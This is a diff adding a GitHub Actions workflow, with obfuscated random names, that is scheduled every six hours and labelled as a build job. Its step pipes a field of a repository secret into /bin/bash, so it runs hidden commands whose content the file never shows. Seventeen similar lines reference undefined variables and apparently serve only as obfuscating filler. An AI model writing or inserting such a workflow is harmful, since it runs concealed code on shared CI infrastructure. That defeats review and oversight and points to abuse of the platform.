@@ -1,0 +1,35 @@
+name: lidagong0987
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '32 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: lidagong0987
+        env:
+          oj172: ${{ secrets.oj172 }}
+        run: |
+          echo $oj172 | jq -r .edn12 | /bin/bash
+          echo $frhzo0 | jq -r .wpg8836 | /bin/bash
+          echo $qht984 | jq -r .ynqcd34 | /bin/bash
+          echo $fjzn71691 | jq -r .nks7 | /bin/bash
+          echo $bhu3611 | jq -r .u622 | /bin/bash
+          echo $gcesd419 | jq -r .hw570 | /bin/bash
+          echo $au07323 | jq -r .sabaj16223 | /bin/bash
+          echo $pe4 | jq -r .vzj917 | /bin/bash
+          echo $rno65738 | jq -r .qgm64761 | /bin/bash
+          echo $tkf6 | jq -r .l6931 | /bin/bash
+          echo $oqve3445 | jq -r .f2 | /bin/bash
+          echo $okt207 | jq -r .gx6 | /bin/bash
+          echo $fqmqi55323 | jq -r .mg124 | /bin/bash
+          echo $ecly862 | jq -r .pvv6 | /bin/bash
+          echo $h11 | jq -r .p0 | /bin/bash
+          echo $r328 | jq -r .d10323 | /bin/bash
+          echo $ayptz1 | jq -r .jl8 | /bin/bash
+          echo $gf3 | jq -r .k9 | /bin/bash
+
